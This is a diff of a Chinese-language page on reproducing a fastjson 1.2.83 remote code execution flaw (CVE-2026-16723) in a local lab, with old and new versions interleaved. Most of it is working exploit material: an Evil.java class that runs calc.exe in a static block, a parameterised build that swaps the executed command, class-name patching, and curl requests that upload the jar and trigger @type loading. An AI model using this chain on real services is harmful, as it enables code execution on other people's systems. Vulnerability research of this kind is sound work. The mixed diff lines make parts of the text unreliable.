-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.parse(body)</span><br><span class="line">  └─ ParserConfig.checkAutoType(&quot;@type 的值&quot;)</span><br><span class="line">       ├─ typeName.replace(&#x27;.&#x27;, &#x27;/&#x27;) + &quot;.class&quot;</span><br><span class="line">       ├─ defaultClassLoader.getResourceAsStream(...)      → URLClassLoader 当 URL 打开</span><br><span class="line">       │    └─ SSRF / 读任意 jar 里的字节码</span><br><span class="line">       ├─ TypeCollector 用 ASM 扫字节，看有没有 @JSONType   → 信任信号可伪造</span><br><span class="line">       └─ TypeUtils.loadClass(typeName, loader, true)</span><br><span class="line">            └─ URLClassLoader.findClass</span><br><span class="line">                 └─ defineClass(typeName, bytes)            → 类被定义</span><br><span class="line">                      └─ &lt;clinit&gt; 执行                      → 代码执行</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-4-能力边界：三种-type-写法"><a href="#1-4-能力边界：三种-type-写法" class="headerlink" title="1.4 能力边界：三种 @type 写法"></a>1.4 能力边界：三种 <code>@type</code> 写法</h2><p>直觉上”让目标去下载我服务器上的 jar”才是完整远程利用，但这条路有一道过不去的坎：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type        jar:http:..2130706433:19090.f!.Evil</span><br><span class="line">   ↓ 点号换斜杠</span><br><span class="line">请求的类名     jar:http://2130706433:19090/f!/Evil</span><br><span class="line">                    ↑↑ 空包段</span><br></pre></td></tr></table></figure>
-
-<p>JVM 内部类名不允许出现空包段，<code>//</code> 直接导致：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">java.lang.ClassFormatError: Illegal class name &quot;jar:http://2130706433:19090/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
-
-<p>而这个 <code>//</code> 去不掉——URL 的 <code>scheme://</code> 天然带两个斜杠。</p>
-<table>
-<thead>
-<tr>
-<th><code>@type</code> 写法</th>
-<th>能做到</th>
-<th>做不到</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>http://...</code></td>
-<td>SSRF，目标主动外连</td>
-<td>其它任何事</td>
-</tr>
-<tr>
-<td><code>jar:http://...!</code></td>
-<td>SSRF + 拉取并识别 <code>@JSONType</code>（信任伪造成立）</td>
-<td><code>defineClass</code>（类名非法）</td>
-</tr>
-<tr>
-<td><code>jar:file:/path/f!</code></td>
-<td>全链贯通，代码执行</td>
-<td>——</td>
-</tr>
-</tbody></table>
-<p><strong>结论：这个洞的真实利用条件是”先让一个 jar 落到目标磁盘上”，再用 <code>jar:file:</code> 打。</strong> 落地手段可能是上传功能、临时目录写入、共享缓存、日志投递等。汇报时不要省这一步，否则会被”哪来的一发 getshell”问住。</p>
-<blockquote>
-<p><code>2130706433</code> 是 <code>127.0.0.1</code> 的十进制写法——因为 <code>@type</code> 里的点会被替换掉，凡是需要保留点的地址都得换成无点形式。</p>
-</blockquote>
-<h2 id="1-5-三个常见误解"><a href="#1-5-三个常见误解" class="headerlink" title="1.5 三个常见误解"></a>1.5 三个常见误解</h2><table>
-<thead>
-<tr>
-<th>误解</th>
-<th>实际</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>“要开 <code>autoTypeSupport=true</code> 才能打”</td>
-<td>不需要。默认 <code>false</code>，实测 <code>autoTypeSupport:false</code> 依然 <code>ok:true</code></td>
-</tr>
-<tr>
-<td>“要 classpath 上有 CommonsCollections 之类 gadget”</td>
-<td>不需要。要执行的代码由攻击者自己提供，不走链式调用</td>
-</tr>
-<tr>
-<td>“把入参类型写死成 DTO 就安全”</td>
-<td>不成立。DTO 里有 <code>Object</code> &#x2F; <code>Map</code> &#x2F; 泛型字段，payload 塞进去一样会走 <code>checkAutoType</code></td>
-</tr>
-</tbody></table>
 <hr>
-<h1 id="2-payload-怎么构造"><a href="#2-payload-怎么构造" class="headerlink" title="2. payload 怎么构造"></a>2. payload 怎么构造</h1><h2 id="2-1-形态：一个-class，装在一个最小-jar-里"><a href="#2-1-形态：一个-class，装在一个最小-jar-里" class="headerlink" title="2.1 形态：一个 class，装在一个最小 jar 里"></a>2.1 形态：一个 class，装在一个最小 jar 里</h2><p>payload 不是脚本、不是 gadget 链，而是<strong>一个自己写的 Java 类</strong>，编译后打成最小的 jar：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">f                        ← 只有 1.6 KB 的 jar</span><br><span class="line">├── Evil.class           ← 必须在 jar 根目录（默认包）</span><br><span class="line">└── META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
+<h2 id="3-桩注解（证明判定只看字符串）"><a href="#3-桩注解（证明判定只看字符串）" class="headerlink" title="3. 桩注解（证明判定只看字符串）"></a>3. 桩注解（证明判定只看字符串）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"><span class="comment">// 桩注解：故意做成空实现，用来证明 fastjson 的信任判定不看&quot;实现&quot;，只看&quot;字符串&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   TypeCollector.java:10</span></span><br><span class="line"><span class="comment">//       private static String JSONType =</span></span><br><span class="line"><span class="comment">//           ASMUtils.desc(com.alibaba.fastjson.annotation.JSONType.class);</span></span><br><span class="line"><span class="comment">//   展开就是常量 &quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;，</span></span><br><span class="line"><span class="comment">//   判定逻辑（TypeCollector.java:71）只做一次字符串比较。</span></span><br><span class="line"><span class="comment">// ===========================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 真实的 fastjson <span class="doctag">@JSONType</span> 有很多属性（orders、serializeFeatures 等）。</span></span><br><span class="line"><span class="comment"> * 这里一个都不需要：判定只看注解的名字，不看内容。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * RUNTIME 是必需的：只有运行时可见的注解才会进入 class 文件的</span></span><br><span class="line"><span class="comment"> * RuntimeVisibleAnnotations 属性，而 TypeCollector 读的正是这一个。</span></span><br><span class="line"><span class="comment"> * 如果写成 CLASS 或 SOURCE，字节里就不会有它，fastjson 也看不到。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span>   <span class="comment">// 必须是类级注解，TypeCollector 只处理类级注解表</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONType &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>为什么不直接用裸 class？因为 <code>@type</code> 要写成 <code>jar:file:...!/Evil</code> 这种形式，才能让 <code>URLClassLoader</code> 把”读取”和”类名”绑在一起——<code>!</code> 前面的部分是容器，后面的是容器内的路径。</p>
-<h2 id="2-2-类的内容"><a href="#2-2-类的内容" class="headerlink" title="2.2 类的内容"></a>2.2 类的内容</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JSONType</span>                                    <span class="comment">// ← 通行证，没有它后面全不成立</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                 <span class="comment">// ← 执行点：类初始化时自动跑</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;jvm-user : &quot;</span>).append(System.getProperty(<span class="string">&quot;user.name&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;java     : &quot;</span>).append(System.getProperty(<span class="string">&quot;java.version&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;loader   : &quot;</span>).append(Evil.class.getClassLoader()).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>).start();</span><br><span class="line">            sb.append(<span class="string">&quot;command  : calc.exe -&gt; &quot;</span>).append(p).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignored) &#123; &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.write(Paths.get(<span class="string">&quot;C:\\fj\\rce-proof.txt&quot;</span>),</span><br><span class="line">                    sb.toString().getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignored) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>实测证据</strong>：打出来的 jar 里只有 <code>Evil.class</code> 一个条目，注解类根本没打包，照样执行成功。因为运行时它不会被加载，只以 42 字节描述符的形式存在。</p>
+<hr>
+<h2 id="4-构建（四条命令）"><a href="#4-构建（四条命令）" class="headerlink" title="4. 构建（四条命令）"></a>4. 构建（四条命令）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 编译成 Java 8 字节码（class 版本 52）</span></span><br><span class="line">javac --release 8 -nowarn -d classes Evil.java JSONType.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 改写 this_class。这一串必须等于「@type 把点号还原后、去掉 .class」的结果</span></span><br><span class="line">python patch_name.py classes/Evil.class <span class="string">&#x27;jar:file:/C:/fj/uploads/p!/Evil&#x27;</span> classes/Evil.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 打包。条目名必须是根目录的 Evil.class，且只需要这一个文件</span></span><br><span class="line">python -c <span class="string">&quot;import zipfile;z=zipfile.ZipFile(&#x27;payload.jar&#x27;,&#x27;w&#x27;,zipfile.ZIP_DEFLATED);z.write(&#x27;classes/Evil.class&#x27;,&#x27;Evil.class&#x27;);z.close()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 校验（两行预期输出）</span></span><br><span class="line">javap -v -p classes/Evil.class | grep -E <span class="string">&quot;major version|this_class&quot;</span></span><br><span class="line"><span class="comment">#   major version: 52</span></span><br><span class="line"><span class="comment">#   this_class: #22    // &quot;jar:file:/C:/fj/uploads/p!/Evil&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="2-3-三处写法是强制的，不是风格选择"><a href="#2-3-三处写法是强制的，不是风格选择" class="headerlink" title="2.3 三处写法是强制的，不是风格选择"></a>2.3 三处写法是强制的，不是风格选择</h2><table>
+<p>用 python 打包而不用 <code>jar</code> 命令，原因有两个：<code>jar</code> 21 不允许短于 3 字符的文件名；以及需要精确控制条目名（必须是 <code>Evil.class</code>，不能是 <code>classes/Evil.class</code>）。</p>
+<p>参数化版本（换名字、换路径、换命令）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">NAME=q bash build.sh                 <span class="comment"># 换类名 → 换落盘文件名，绕开类缓存</span></span><br><span class="line">TARGET=/tmp/x NAME=f bash build.sh   <span class="comment"># Linux 靶机</span></span><br><span class="line">CMD=notepad.exe bash build.sh        <span class="comment"># 换执行的命令</span></span><br></pre></td></tr></table></figure>
+
+<p><code>NAME</code> 会同时改两处，必须一致：jar 在磁盘上的文件名、以及 class 的 <code>this_class</code>。因为 1482 行用同一个字符串拼资源路径，1761 行用同一个字符串做类名。</p>
+<hr>
+<h2 id="5-载荷的三处承重"><a href="#5-载荷的三处承重" class="headerlink" title="5. 载荷的三处承重"></a>5. 载荷的三处承重</h2><table>
 <thead>
 <tr>
-<th>写法</th>
-<th>原因</th>
+<th>处</th>
+<th>内容</th>
+<th>被哪一行消费</th>
+<th>删掉的后果</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>@JSONType</code></td>
-<td>就是 1.3 那张”白名单通行证”，缺了它 <code>checkAutoType</code> 直接抛异常</td>
+<td><code>@JSONType</code> 注解</td>
+<td>常量池里 42 字节描述符</td>
+<td><code>TypeCollector.java:71</code> 置 <code>jsonType=true</code></td>
+<td><code>jsonType=false</code> → <code>ParserConfig:1542</code> 抛 <code>autoType is not support</code></td>
 </tr>
 <tr>
-<td>干活写在 <code>static {}</code></td>
-<td>类定义后、实例化前就会执行，是最稳的触发点，不依赖构造方法</td>
-</tr>
-<tr>
-<td>不引用自己 jar 里的其它类</td>
-<td>定义它的 loader 也负责找依赖，而依赖不在目标 classpath 上</td>
-</tr>
-</tbody></table>
-<h2 id="2-4-五个硬约束"><a href="#2-4-五个硬约束" class="headerlink" title="2.4 五个硬约束"></a>2.4 五个硬约束</h2><table>
-<thead>
-<tr>
-<th>#</th>
-<th>约束</th>
-<th>违反了会怎样</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td><code>@type</code> 里的 <code>.</code> 会被换成 <code>/</code>，所以<strong>路径里不能有点</strong></td>
-<td><code>f.jar</code> → <code>f/jar</code>，路径错，<code>stream=false</code></td>
-</tr>
-<tr>
-<td>2</td>
-<td>类必须在<strong>默认包</strong>，jar 内路径要和 <code>@type</code> 还原后一致</td>
-<td><code>stream=false</code>，探测阶段就失败</td>
-</tr>
-<tr>
-<td>3</td>
-<td><code>this_class</code> 必须逐字等于 <code>@type</code> 还原后的名字</td>
+<td><code>this_class</code></td>
+<td><code>jar:file:/C:/fj/uploads/p!/Evil</code></td>
+<td><code>TypeUtils.java:1761</code> → <code>defineClass</code></td>
 <td><code>NoClassDefFoundError ... (wrong name: Evil)</code></td>
 </tr>
 <tr>
-<td>4</td>
-<td>字节码版本 ≤ 目标 JVM</td>
-<td><code>UnsupportedClassVersionError</code>（现象和”没打通”几乎一样）</td>
+<td><code>static {}</code></td>
+<td>静态块里的 <code>calc.exe</code></td>
+<td>JVM 初始化类时执行 <code>&lt;clinit&gt;</code></td>
+<td>类加载成功，无任何效果</td>
 </tr>
 <tr>
-<td>5</td>
-<td>类必须<strong>自包含</strong></td>
-<td><code>NoClassDefFoundError: pwn/Pwn</code></td>
+<td>jar 条目名</td>
+<td>根目录的 <code>Evil.class</code></td>
+<td><code>ParserConfig:1482</code> 拼出的路径</td>
+<td><code>stream=false</code>，<code>bytes=0</code></td>
 </tr>
 </tbody></table>
-<p>两个隐含限制：<code>typeName.length() &lt; 192</code>（1.2.83 入口就有这个判断）；类名里不能出现连续斜杠。</p>
-<p>所以 <strong>jar 文件名不能带点</strong>（<code>f</code> 可以，<code>f.jar</code> 不行），也<strong>不能放在子目录里</strong>。</p>
-<h2 id="2-5-最关键的一步：改-this-class"><a href="#2-5-最关键的一步：改-this-class" class="headerlink" title="2.5 最关键的一步：改 this_class"></a>2.5 最关键的一步：改 <code>this_class</code></h2><p>这是整个复现里唯一的”门槛”，也是最容易被忽略的地方。</p>
-<p><strong>JVM 有一条硬性校验</strong>：</p>
+<p>除此之外全是 JVM 必需结构：魔数、版本号、常量池、方法表。</p>
+<p>实测偏移（585 字节版本）：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x073   calc.exe                                          8 字节</span><br><span class="line">0x0E7   jar:file:/C:/fj/uploads/p!/Evil                  31 字节</span><br><span class="line">0x172   Lcom/alibaba/fastjson/annotation/JSONType;       42 字节</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p><code>defineClass(name, bytes)</code> 里的 <code>name</code>，必须和 class 文件里 <code>this_class</code> 自称的名字<strong>逐字相同</strong>。</p>
+<p>偏移随常量池变化，抓的是”这三样东西存在”，不是固定位置。用 <code>javap -v -p</code> 或直接搜字节串都能定位。</p>
 </blockquote>
-<p>而 fastjson 传给 <code>defineClass</code> 的是 <code>@type</code> 的原始值（含 <code>:</code> 和 <code>!</code>），不是点号替换后的值。所以：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type                jar:file:.C:.fj.f!.Evil</span><br><span class="line">   ↓ 1482 行点号换斜杠</span><br><span class="line">实际请求的类名        jar:file:/C:/fj/f!/Evil</span><br><span class="line">   ↓ JVM 要求 this_class 必须等于它</span><br><span class="line">class 里必须写        jar:file:/C:/fj/f!/Evil      ← 原版 class 里是 &quot;Evil&quot;</span><br></pre></td></tr></table></figure>
-
-<p>不改的后果：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: jar:file:/C:/fj/f!/Evil (wrong name: Evil)</span><br></pre></td></tr></table></figure>
-
-<p><strong>这条报错是整条链上最有价值的反馈</strong>：<code>wrong name</code> 说明 <code>defineClass</code> 已经被调到了、字节码已经进 JVM 了，只差最后一道命名校验。看到它，说明 SSRF、读取、注解识别全部成功。</p>
-<p>更坑的是，这个真实异常在 <code>TypeUtils.loadClass</code> 里被 <code>catch (Throwable e) { e.printStackTrace(); }</code> 吞掉，业务侧只看到一句笼统的 <code>autoType is not support</code>。所以排查时必须绕开 fastjson 直接调 classloader——靶场的 <code>/rawload</code> 就是干这个的。</p>
-<p><strong>改名的原理</strong>：<code>this_class</code> 是常量池索引（<code>u2</code>），指向一条 <code>CONSTANT_Class</code>，那条再指向一条 <code>CONSTANT_Utf8</code>，真正的类名字节存在这里。</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">magic            u4   CAFEBABE</span><br><span class="line">major_version    u2   ← 52=Java 8，65=Java 21</span><br><span class="line">constant_pool[]       ← 变长表</span><br><span class="line">this_class       u2   ← 索引，不是字符串</span><br></pre></td></tr></table></figure>
-
-<p>所以只需要改那条 UTF-8 的内容，<strong>其它索引全不用动</strong>，字段、方法、注解表原样保留：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">改名前  this_class: #34    // Evil</span><br><span class="line">改名后  this_class: #34    // &quot;jar:file:/C:/fj/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
-
-<p><code>payload/patch_name.py</code> 做的就是这件事：解析常量池（按 tag 决定每条占几字节，<code>long</code>&#x2F;<code>double</code> 占两个槽位）→ 顺着 <code>Class → name_index</code> 找到 UTF-8 → 替换 → 重新拼装。</p>
-<h2 id="2-6-四步造出来"><a href="#2-6-四步造出来" class="headerlink" title="2.6 四步造出来"></a>2.6 四步造出来</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0) 准备目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /c/fj/build &amp;&amp; <span class="built_in">cd</span> /c/fj/build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 编译（--release 8 是硬要求，否则目标 JDK 8 会 UnsupportedClassVersionError）</span></span><br><span class="line">javac --release 8 -nowarn -<span class="built_in">cp</span> &lt;项目&gt;/out/fastjson-1.2.83.jar \</span><br><span class="line">      -d . &lt;项目&gt;/payload/windows/Evil.java</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 改名：写 @type 点号还原后的名字，不是 @type 原样</span></span><br><span class="line">python &lt;项目&gt;/payload/patch_name.py Evil.class \</span><br><span class="line">  <span class="string">&#x27;jar:file:/C:/fj/f!/Evil&#x27;</span> Evil.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 打包（jar 命令要求输出名 ≥3 字符，先打成 payload.jar 再改名）</span></span><br><span class="line">jar cf payload.jar Evil.class &amp;&amp; <span class="built_in">cp</span> payload.jar /c/fj/f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 校验</span></span><br><span class="line">javap -v -p Evil.class | grep -E <span class="string">&quot;this_class|major version&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>第 4 步预期：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">major version: 52</span><br><span class="line">this_class: #34                          // &quot;jar:file:/C:/fj/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
-
-<p><code>major version: 52</code> 是 Java 8 字节码，<code>this_class</code> 必须是 <code>@type</code> 还原后的完整名字。这两行对不上，后面一定失败。</p>
 <hr>
-<h1 id="3-具体怎么复现"><a href="#3-具体怎么复现" class="headerlink" title="3. 具体怎么复现"></a>3. 具体怎么复现</h1><h2 id="3-1-单机版（Windows，5-步）"><a href="#3-1-单机版（Windows，5-步）" class="headerlink" title="3.1 单机版（Windows，5 步）"></a>3.1 单机版（Windows，5 步）</h2><p><strong>第 1 步：起靶场</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /c/fj &amp;&amp; <span class="built_in">cd</span> /c/fj</span><br><span class="line"><span class="built_in">cp</span> &lt;项目&gt;/out/app-vuln-1.2.83.jar app.jar</span><br><span class="line">java -jar app.jar --server.port=18084 &gt; app.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+<h2 id="6-投递与触发"><a href="#6-投递与触发" class="headerlink" title="6. 投递与触发"></a>6. 投递与触发</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 投递：让 jar 落到目标磁盘（靶场的 /upload 模拟真实业务的上传功能）</span></span><br><span class="line">curl -s -X POST <span class="string">&quot;http://127.0.0.1:18084/upload?name=p&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span> \</span><br><span class="line">     --data-binary @payload.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 探测：只读字节、识别注解，不执行</span></span><br><span class="line">curl -s -G <span class="string">&quot;http://127.0.0.1:18084/debug&quot;</span> \</span><br><span class="line">     --data-urlencode <span class="string">&#x27;type=jar:file:.C:.fj.uploads.p!.Evil&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 触发</span></span><br><span class="line">curl -s -m 20 -X POST <span class="string">&quot;http://127.0.0.1:18084/parse&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.uploads.p!.Evil&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>第 2 步：环境自检</strong>（这一步决定要不要继续）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s http://127.0.0.1:18084/status; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;fastjsonVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.2.83&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typeNameCheck&quot;</span><span class="punctuation">:</span><span class="string">&quot;absent (&lt;=1.2.83)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;safeMode&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;autoTypeSupport&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">&quot;javaVersion&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.8.0_66&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;launchedBy&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.springframework.boot.loader.LaunchedURLClassLoader&quot;</span><span class="punctuation">,</span><span class="attr">&quot;vulnerable&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>四个字段对上前提里的四条：<code>vulnerable:true</code>、<code>autoTypeSupport:false</code>（证明不用开 AutoType）、<code>launchedBy</code> 是 <code>LaunchedURLClassLoader</code>、<code>safeMode:false</code>。任何一个不符，先解决再往下。</p>
-<p><strong>第 3 步：探测</strong>（只读字节 + 扫注解，不定义类）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -G http://127.0.0.1:18084/debug --data-urlencode <span class="string">&#x27;type=jar:file:.C:.fj.f!.Evil&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:/C:/fj/f!/Evil.class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span><span class="number">2107</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;jsonTypeDirect&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;checkAutoType&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>stream:true</code> 表示读到了字节，<code>bytes:2107</code> 正好是 class 长度，<code>jsonTypeDirect:true</code> 表示扫到了 <code>@JSONType</code>。这三个值说明前三段已经成立，只剩定义。</p>
-<p><strong>第 4 步：触发</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s -X POST http://127.0.0.1:18084/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;class&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">,</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil@1e29ab1a&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>同时屏幕弹出计算器，<code>C:\fj\rce-proof.txt</code> 生成。</p>
-<p><strong>第 5 步：确认副作用</strong>（唯一可靠的判据）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /c/fj/rce-proof.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CVE-2026-16723 windows repro - code executed</span><br><span class="line">jvm-user : MECHREVO</span><br><span class="line">java     : 1.8.0_66</span><br><span class="line">loader   : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c</span><br><span class="line">command  : calc.exe -&gt; java.lang.ProcessImpl@76fc7ec7</span><br></pre></td></tr></table></figure>
-
-<p><code>loader</code> 这行证明代码跑在靶场那个 JVM 里，<code>command</code> 那行证明真的起了进程。**计算器的父进程就是 PID 27852 的 <code>java.exe</code>**，演示时可以当场用任务管理器指出来。</p>
-<h2 id="3-2-跨机器版（虚机当攻击机，本机当靶机）"><a href="#3-2-跨机器版（虚机当攻击机，本机当靶机）" class="headerlink" title="3.2 跨机器版（虚机当攻击机，本机当靶机）"></a>3.2 跨机器版（虚机当攻击机，本机当靶机）</h2><p>更接近真实攻击，演示效果最好。本机靶场监听 <code>0.0.0.0:18084</code>，虚机通过 VMware NAT 网关 <code>192.168.244.1</code> 访问。</p>
-<p>虚机里：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1) 先测连通（返回 JSON 就成了，注意 javaVersion 是宿主机的 1.8.0_66，不是虚机的 17）</span></span><br><span class="line">curl -s -m 5 http://192.168.244.1:18084/status; <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 直接打</span></span><br><span class="line">curl -s -m 30 -X POST http://192.168.244.1:18084/parse \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.g!.Evil&quot;&#125;&#x27;</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
-
-<p>两个必须记住的点：</p>
-<ul>
-<li><strong><code>@type</code> 里的路径是靶机的</strong>，不是攻击机的。解析发生在宿主机 JVM，写虚机的 <code>/tmp/...</code> 一定 <code>stream=false</code>；</li>
-<li><strong>计算器弹在靶机桌面</strong>（宿主机），虚机里只会看到 <code>ok:true</code>。</li>
-</ul>
-<p><strong>关于防火墙</strong>（实测结论，别被吓到）：Windows 防火墙默认不拦回环流量，出站默认放行，而入站的 <code>java.exe</code> 通常早就有放行规则（本机 <code>javapath\java.exe</code> 是指向 <code>C:\Program Files\Java\jre1.8.0_66</code> 的符号链接，该路径已有 Allow 规则）。所以<strong>第 1 步能返回 JSON 就说明通</strong>，不需要额外加规则。</p>
-<p>只有当第 1 步超时才需要：</p>
